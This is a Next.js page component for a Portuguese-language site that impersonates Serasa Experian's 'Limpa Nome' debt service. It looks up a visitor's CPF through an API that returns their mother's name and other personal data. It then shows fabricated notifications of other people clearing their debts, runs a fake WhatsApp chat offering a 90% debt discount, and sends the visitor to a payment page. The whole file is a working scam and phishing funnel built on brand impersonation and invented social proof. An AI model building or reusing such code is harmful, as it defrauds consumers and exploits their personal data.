'use client';

import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';

export default function Home() {
  const [step, setStep] = useState('vsl');
  const [cpf, setCpf] = useState('');
  const [userData, setUserData] = useState(null);
  const [motherOptions, setMotherOptions] = useState([]);
  const [chatMessages, setChatMessages] = useState([]);
  const [chatActions, setChatActions] = useState([]);
  const [vslProgress, setVslProgress] = useState(0);
  const [isVslOverlayActive, setIsVslOverlayActive] = useState(true);
  const [notifications, setNotifications] = useState([]);
  const router = useRouter();
  
  const vslMainRef = useRef(null);
  const vslBgRef = useRef(null);
  const chatEndRef = useRef(null);
  const canvasRef = useRef(null);

  // Particles logic
  useEffect(() => {
    if (!canvasRef.current) return;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    let particles = [];
    const particleCount = 60;
    const connectionDistance = 150;

    const resize = () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    };
    window.addEventListener('resize', resize);
    resize();

    class Particle {
      constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.vx = (Math.random() - 0.5) * 0.5;
        this.vy = (Math.random() - 0.5) * 0.5;
        this.size = 2;
      }
      update() {
        this.x += this.vx;
        this.y += this.vy;
        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
      }
      draw() {
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(0, 0, 0, 0.2)';
        ctx.fill();
      }
    }

    for (let i = 0; i < particleCount; i++) particles.push(new Particle());

    const animate = () => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      for (let i = 0; i < particles.length; i++) {
        const p1 = particles[i];
        p1.update();
        p1.draw();
        for (let j = i + 1; j < particles.length; j++) {
          const p2 = particles[j];
          const dx = p1.x - p2.x;
          const dy = p1.y - p2.y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist < connectionDistance) {
            ctx.beginPath();
            ctx.strokeStyle = `rgba(0, 0, 0, ${0.1 * (1 - dist / connectionDistance)})`;
            ctx.lineWidth = 1;
            ctx.moveTo(p1.x, p1.y);
            ctx.lineTo(p2.x, p2.y);
            ctx.stroke();
          }
        }
      }
      requestAnimationFrame(animate);
    };
    animate();
    return () => window.removeEventListener('resize', resize);
  }, []);

  // Notifications logic
  useEffect(() => {
    if (step === 'vsl') return;
    const names = ['João', 'Maria', 'Carlos', 'Ana', 'Pedro', 'Julia', 'Marcos', 'Fernanda', 'Ricardo', 'Beatriz'];
    const surnames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira'];
    
    const createNotify = () => {
      const name = names[Math.floor(Math.random() * names.length)];
      const surname = surnames[Math.floor(Math.random() * surnames.length)];
      const cpfMask = `${Math.floor(Math.random() * 900 + 100)}.***.***-${Math.floor(Math.random() * 90 + 10)}`;
      const limit = (Math.random() * 5000 + 1000).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
      const id = Date.now();
      
      setNotifications(prev => [...prev, { id, name, surname, cpfMask, limit }]);
      setTimeout(() => {
        setNotifications(prev => prev.filter(n => n.id !== id));
      }, 5000);
    };

    const timer = setTimeout(createNotify, 3000);
    const interval = setInterval(createNotify, 10000 + Math.random() * 7000);
    return () => { clearTimeout(timer); clearInterval(interval); };
  }, [step]);

  // Mask CPF
  const handleCpfChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 11) value = value.slice(0, 11);
    value = value.replace(/(\d{3})(\d)/, '$1.$2');
    value = value.replace(/(\d{3})(\d)/, '$1.$2');
    value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    setCpf(value);
  };

  const startConsultation = async () => {
    const rawCpf = cpf.replace(/\D/g, '');
    if (rawCpf.length !== 11) {
      alert('Por favor, insira um CPF válido.');
      return;
    }
    setStep('loading');
    try {
      const response = await fetch(`/api/consultar-cpf/${rawCpf}`);
      const data = await response.json();
      if (data.DADOS && data.DADOS.NOME_MAE) {
        setUserData(data.DADOS);
        localStorage.setItem('user_data', JSON.stringify(data.DADOS));
        setTimeout(() => {
          initSecurityStep(data.DADOS.NOME_MAE);
        }, 2000);
      } else {
        alert('CPF não encontrado ou erro na consulta. Tente novamente.');
        setStep('cpf');
      }
    } catch (error) {
      console.error('Error fetching data:', error);
      alert('Erro ao conectar com o servidor. Tente novamente mais tarde.');
      setStep('cpf');
    }
  };

  const initSecurityStep = (realMotherName) => {
    const fakes = ["MARIA APARECIDA DOS SANTOS", "ANA PAULA OLIVEIRA SILVA", "TEREZA CRISTINA FERREIRA", "REGINA LUCIA SOUZA"];
    const list = [realMotherName];
    let count = 0;
    while (list.length < 4 && count < fakes.length) {
      if (fakes[count] !== realMotherName) list.push(fakes[count]);
      count++;
    }
    setMotherOptions(list.sort(() => Math.random() - 0.5));
    setStep('security');
  };

  const handleMotherSelection = (name) => {
    if (name === userData.NOME_MAE) {
      setStep('chat');
      initChat();
    } else {
      alert('Nome incorreto. Tente novamente para sua segurança.');
    }
  };

  const initChat = () => {
    runChatStep(1);
  };

  const runChatStep = async (stepId, customData = {}) => {
    const flow = [
      {
        id: 1,
        messages: [
          `Olá, ${userData?.NOME.split(' ')[0]}! Identificamos pendências vinculadas ao seu CPF que estão bloqueando seu acesso ao crédito.`,
          "Para seguirmos com a sua proposta de quitação, informe qual o valor total aproximado das dívidas que você deseja regularizar hoje:"
        ],
        inputType: "number",
        placeholder: "Ex: 5000",
        nextId: 2
      },
      {
        id: 2,
        messages: [
          "Processando acordos disponíveis...",
          "Ótima notícia! Conseguimos uma liberação especial para o seu perfil.",
          "Sua dívida total de {{ORIGINAL}} pode ser liquidada integralmente por apenas {{DISCOUNTED}}.",
          "Deseja visualizar os detalhes do seu acordo e garantir sua certidão de NADA CONSTA agora?"
        ],
        actions: [{ text: "VER MINHA PROPOSTA AGORA", isAgreement: true }]
      }
    ];

    const currentStep = flow.find(s => s.id === stepId);
    if (!currentStep) return;
    setChatActions([]);
    for (let text of currentStep.messages) {
      if (customData.original) {
        const discount = (customData.original * 0.1).toFixed(2);
        text = text.replace('{{ORIGINAL}}', parseFloat(customData.original).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }));
        text = text.replace('{{DISCOUNTED}}', parseFloat(discount).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }));
        localStorage.setItem('debt_original', customData.original);
        localStorage.setItem('debt_discounted', discount);
      }
      setChatMessages(prev => [...prev, { type: 'received', typing: true }]);
      await new Promise(r => setTimeout(r, 1500));
      setChatMessages(prev => {
        const filtered = prev.filter(m => !m.typing);
        return [...filtered, { type: 'received', text, time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }];
      });
    }
    if (currentStep.inputType) {
      setChatActions([{ type: 'input', placeholder: currentStep.placeholder, nextId: currentStep.nextId }]);
    } else if (currentStep.actions) {
      setChatActions(currentStep.actions.map(a => ({ ...a, type: 'button' })));
    }
  };

  const handleVslPlay = () => {
    if (vslMainRef.current.paused) {
      vslMainRef.current.play().then(() => {
        setIsVslOverlayActive(false);
        if (vslBgRef.current) vslBgRef.current.play();
      }).catch(() => {
        vslMainRef.current.muted = true;
        vslMainRef.current.play();
        setIsVslOverlayActive(false);
      });
    } else {
      vslMainRef.current.pause();
      setIsVslOverlayActive(true);
    }
  };

  useEffect(() => {
    if (step === 'chat' && chatEndRef.current) {
      chatEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [chatMessages, step]);

  return (
    <div className="min-h-screen">
      <div className="particles-bg">
        <canvas ref={canvasRef} />
      </div>

      <header className={`main-header ${step === 'vsl' ? 'hidden' : ''}`}>
        <div className="container">
          <div className="header-flex">
            <div className="logo">
              <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg">
                <path d="M623.83 240.949h-118.542c-35.291 0-63.817-27.989-63.817-62.456v-116.072c0-34.467 28.526-62.421 63.817-62.421h118.542c35.183 0 63.745 27.953 63.745 62.421v116.072c0 34.467-28.562 62.456-63.745 62.456zM317.203 501.083h-133.324c-39.621 0-71.762-31.354-71.762-70.223v-130.568c0-38.798 32.141-70.295 71.762-70.295h133.324c39.621 0 71.762 31.497 71.762 70.295v130.568c0 38.87-32.141 70.223-71.762 70.223zM304.497 772.061h-81.462c-0.129 0.001-0.28 0.002-0.432 0.002-23.815 0-43.151-19.174-43.413-42.928v-79.697c0-23.801 19.685-43.022 43.845-43.022h81.462c24.195 0 43.881 19.22 43.881 43.022v79.672c0 23.766-19.685 42.95-43.881 42.95zM523.148 1023.999h-96.28c-28.633 0-51.826-22.62-51.826-50.717v-94.275c0-28.061 23.193-50.753 51.826-50.753h96.28c28.633 0 51.826 22.692 51.826 50.753v94.275c0 28.096-23.193 50.717-51.826 50.717zM876.018 288.408h-66.716c-0.096 0.001-0.21 0.001-0.324 0.001-19.479 0-35.297-15.669-35.538-35.090v-65.271c0.201-19.455 16.020-35.15 35.503-35.15 0.126 0 0.253 0.001 0.379 0.002h66.697c0.107-0.001 0.234-0.002 0.36-0.002 19.484 0 35.302 15.694 35.503 35.131v65.267c0 19.328-16.035 35.112-35.863 35.112zM653.287 554.305c-23.551-12.634-47.71-24.231-71.082-37.080-10.034-5.403-18.671-11.758-26.304-19.143l0.032 0.030c-17.967-17.86-15.033-44.060 5.941-55.62 6.196-3.272 13.419-5.585 21.066-6.52l0.302-0.030c21.761-2.863 41.626 2.792 60.667 13.386 9.485 5.333 20.258 9.27 30.96 11.489 11.167 2.291 21.010-2.756 27.918-11.883 3.262-4.013 5.237-9.185 5.237-14.82 0-4.958-1.53-9.559-4.143-13.357l0.051 0.079c-4.719-7.554-10.529-13.935-17.296-19.131l-0.17-0.125c-26.557-19.542-57.195-27.703-90.088-28.633-24.088 0.394-47.066 5.261-68.362 16.858-45.813 25.018-63.709 73.48-44.024 120.725 9.628 22.978 27.202 39.335 48.82 51.218 19.077 10.487 38.941 19.578 58.484 29.242 16.357 8.125 32.284 16.894 45.098 30.065 15.856 16.214 19.184 34.718 8.769 49.929-7.838 11.382-19.685 16.285-33 18.433-26.235 4.152-50.108-2.362-72.442-15.82-7.731-4.653-15.641-9.521-24.052-12.634-24.195-8.948-46.637 8.375-42.091 32.069 2.076 10.559 8.876 18.361 16.929 25.162 41.948 35.505 118.113 44.382 168.543 19.685 54.224-26.557 73.122-83.359 45.205-136.223-11.31-21.511-29.85-35.935-50.967-47.352zM771.006 750.515c-0.032 0.001-0.070 0.001-0.108 0.001-2.216 0-4.020-1.767-4.079-3.968v-41.882h-9.556c0 0 0 0-0.001 0-2.234 0-4.044-1.811-4.044-4.044 0-0.026 0-0.050 0.001-0.075v0.003c0-2.362 1.718-4.116 4.044-4.116h27.667c2.291 0 4.044 1.79 4.044 4.116 0 2.291-1.79 4.080-4.044 4.080h-9.7v41.876c0 2.291-1.79 4.009-4.223 4.009zM820.47 750.586c-2.255 0-3.579-1.646-4.116-3.221l-11.919-34.217v33.394c0 2.291-1.79 3.973-4.152 3.973-0.032 0.001-0.072 0.001-0.11 0.001-2.224 0-4.036-1.763-4.114-3.967v-44.209c0.135-3.401 2.888-6.116 6.293-6.192h0.007c2.684 0 5.19 1.897 6.085 4.546l12.062 34.611 11.954-34.611c0.87-2.617 3.269-4.482 6.113-4.546h0.008c3.411 0.076 6.164 2.791 6.299 6.18v44.215c0 2.291-1.79 3.973-4.223 3.973-0.021 0-0.047 0.001-0.073 0.001-2.216 0-4.019-1.766-4.079-3.968v-33.328c5.243-18.401 1.231-7.060-2.735 4.304l-9.077 29.877c-0.966 2.076-2.398 3.221-4.188 3.221z"/>
              </svg>
            </div>
            <div className="header-tagline">Limpa Nome</div>
          </div>
        </div>
      </header>

      <div className="notification-container">
        {notifications.map(n => (
          <div key={n.id} className="notification">
            <div className="notify-icon">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M20 6L9 17l-5-5"/>
              </svg>
            </div>
            <div className="notify-content">
              <p><strong>{n.name} {n.surname}</strong> ({n.cpfMask})</p>
              <p>Limpou o nome agora e liberou <strong>{n.limit}</strong> de crédito!</p>
            </div>
          </div>
        ))}
      </div>

      <main id="app">
        {step === 'vsl' && (
          <section className="active" id="step-vsl">
            <div className="vsl-hero">
              <div className="container text-center">
                <h1 className="vsl-title">ATENÇÃO: Recupere seu score e limpe seu nome em poucos minutos</h1>
                <p className="vsl-subtitle">Siga o passo a passo oficial para regularizar seu CPF com descontos exclusivos</p>
                <div className="vsl-wrapper">
                  <div className="vsl-container" onClick={handleVslPlay}>
                    <video ref={vslBgRef} className="vsl-bg-video" loop muted playsInline preload="auto">
                      <source src="/serasa.mp4" type="video/mp4" />
                    </video>
                    <div className="vsl-content">
                      <video 
                        ref={vslMainRef} 
                        className="vsl-main-video" 
                        playsInline 
                        preload="auto"
                        onTimeUpdate={() => setVslProgress((vslMainRef.current.currentTime / vslMainRef.current.duration) * 100)}
                        onEnded={() => setStep('cpf')}
                      >
                        <source src="/serasa.mp4" type="video/mp4" />
                      </video>
                      {isVslOverlayActive && (
                        <div className="vsl-overlay active">
                          <div className="play-circle">
                            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
                          </div>
                          <span>ASSISTIR AGORA</span>
                        </div>
                      )}
                      <div className="vsl-progress-container">
                        <div className="vsl-progress-bar" style={{ width: `${vslProgress}%` }}></div>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="vsl-footer-info">
                  <p>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" style={{verticalAlign: 'middle', marginRight: '4px'}}>
                      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                    </svg>
                    Conexão Segura e Criptografada
                  </p>
                </div>
              </div>
            </div>
          </section>
        )}

        {step === 'cpf' && (
          <section className="active">
            <div className="hero-section">
              <div className="bg-shapes">
                <div className="shape shape-1"></div>
                <div className="shape shape-2"></div>
                <div className="shape shape-3"></div>
              </div>
              <div className="container">
                <div className="hero-content">
                  <h1>Regularize seu CPF e volte a ter crédito no mercado</h1>
                  <p>Consulte agora e descubra como quitar suas dívidas com até 99% de desconto através do Feirão Limpa Nome.</p>
                  <div className="card cpf-card">
                    <div className="form-group">
                      <label htmlFor="cpf">Digite seu CPF</label>
                      <input type="text" id="cpf" placeholder="000.000.000-00" value={cpf} onChange={handleCpfChange} maxLength="14" />
                    </div>
                    <button onClick={startConsultation} className="btn-primary">Consultar CPF</button>
                    <p className="terms">Ao continuar, você concorda com nossos <a href="#">Termos de Uso</a> e <a href="#">Política de Privacidade</a>.</p>
                  </div>
                </div>
              </div>
            </div>
            <div className="benefits-section">
              <div className="container">
                <div className="benefits-grid">
                  <div className="benefit-item">
                    <div className="benefit-icon">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 1v22m5-18H8.5a4.5 4.5 0 0 0 0 9h7a4.5 4.5 0 0 1 0 9H7"></path></svg>
                    </div>
                    <h3>Descontos Históricos</h3>
                    <p>Aproveite as maiores reduções do ano para quitar seus débitos à vista ou parcelado com condições especiais.</p>
                  </div>
                  <div className="benefit-item">
                    <div className="benefit-icon">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                    </div>
                    <h3>Consulta Oficial</h3>
                    <p>Sistema 100% seguro e integrado com a base de dados nacional para garantir sua total proteção.</p>
                  </div>
                  <div className="benefit-item">
                    <div className="benefit-icon">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg>
                    </div>
                    <h3>Crédito Imediato</h3>
                    <p>Após a confirmação do pagamento, seu nome é limpo em até 5 dias e seu score volta a subir.</p>
                  </div>
                </div>
              </div>
            </div>
          </section>
        )}

        {step === 'loading' && (
          <section className="active">
            <div className="container text-center py-20">
              <div className="loader mx-auto mb-5"></div>
              <h2>Buscando informações...</h2>
              <p>Aguarde enquanto consultamos nossa base de dados.</p>
            </div>
          </section>
        )}

        {step === 'security' && (
          <section className="active">
            <div className="container">
              <div className="card security-card">
                <h2>Verificação de Segurança</h2>
                <p>Para sua proteção, selecione o nome completo da sua mãe:</p>
                <div className="options-grid">
                  {motherOptions.map((name, i) => (
                    <button key={i} className="option-btn" onClick={() => handleMotherSelection(name)}>{name}</button>
                  ))}
                </div>
              </div>
            </div>
          </section>
        )}

        {step === 'chat' && (
          <section className="active">
            <div className="whatsapp-container">
              <div className="whatsapp-header">
                <div className="wa-user-info">
                  <img src="https://ui-avatars.com/api/?name=Serasa+Limpa+Nome&background=E63888&color=fff" alt="Serasa" className="wa-avatar" />
                  <div className="wa-status">
                    <span className="wa-name">Serasa Limpa Nome</span>
                    <span className="wa-online">online</span>
                  </div>
                </div>
              </div>
              <div className="whatsapp-body">
                {chatMessages.map((msg, i) => (
                  <div key={i} className={`msg-wrapper ${msg.type}`}>
                    <img className="msg-avatar" src={msg.type === 'received' ? "https://ui-avatars.com/api/?name=S&background=E63888&color=fff" : `https://ui-avatars.com/api/?name=${userData?.NOME}&background=2D3277&color=fff`} alt="avatar" />
                    <div className={`message ${msg.type} ${msg.typing ? 'typing' : ''}`}>
                      {msg.typing ? <span></span> : msg.text}
                      {!msg.typing && <span className="time">{msg.time}</span>}
                      {msg.typing && (<><span></span><span></span></>)}
                    </div>
                  </div>
                ))}
                <div ref={chatEndRef} />
              </div>
              <div className="chat-actions">
                {chatActions.map((action, i) => (
                  <div key={i} className="w-full">
                    {action.type === 'input' && (
                      <div className="chat-input-action">
                        <input type="number" id="step-input" placeholder={action.placeholder} onKeyDown={(e) => {
                          if (e.key === 'Enter') {
                            const val = e.target.value;
                            if (val > 0) {
                              setChatMessages(prev => [...prev, { type: 'sent', text: `R$ ${val}`, time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }]);
                              runChatStep(action.nextId, { original: val });
                            }
                          }
                        }} />
                        <button className="btn-action" onClick={() => {
                          const val = document.getElementById('step-input').value;
                          if (val > 0) {
                            setChatMessages(prev => [...prev, { type: 'sent', text: `R$ ${val}`, time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }]);
                            runChatStep(action.nextId, { original: val });
                          }
                        }}>Enviar</button>
                      </div>
                    )}
                    {action.type === 'button' && (
                      <button className="btn-action" onClick={() => {
                        setChatMessages(prev => [...prev, { type: 'sent', text: action.text, time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }]);
                        if (action.isAgreement) {
                          router.push('/acordo');
                        } else {
                          runChatStep(action.nextId);
                        }
                      }}>{action.text}</button>
                    )}
                  </div>
                ))}
              </div>
              <div className="whatsapp-footer">
                <div className="wa-input-placeholder">Digite uma mensagem...</div>
                <div className="wa-send-btn">
                  <svg viewBox="0 0 24 24" width="24" height="24"><path fill="currentColor" d="M1.101 21.757L23.8 12.028 1.101 2.3l.011 7.912 13.623 1.816-13.623 1.817-.011 7.912z"></path></svg>
                </div>
              </div>
            </div>
          </section>
        )}
      </main>

      <footer className="main-footer">
        <div className="container">
          <p>&copy; 2024 Serasa Experian. Todos os direitos reservados.</p>
        </div>
      </footer>
    </div>
  );
}
